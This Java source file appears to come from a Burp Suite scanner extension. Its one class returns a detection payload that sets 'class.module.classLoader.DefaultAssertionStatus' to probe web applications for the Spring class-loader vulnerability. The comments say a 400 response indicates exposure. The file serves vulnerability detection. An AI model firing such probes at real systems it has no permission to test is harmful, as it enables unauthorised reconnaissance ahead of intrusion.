package burp.payload.pocs;

import burp.payload.IPoc;

/**
 * @author : metaStor
 * @date : Created 2022/4/7
 * @description: 回显检测
 * POC:
 * class.module.classLoader.DefaultAssertionStatus=xxx => status_code: 400
 * class.module.classLoader.DefaultAssertionStatus=false => 页面正常
 * */
public class POC1 implements IPoc {

    public POC1() {    }

    @Override
    public String genPoc() {
        return "class.module.classLoader.DefaultAssertionStatus=%s";
    }
}
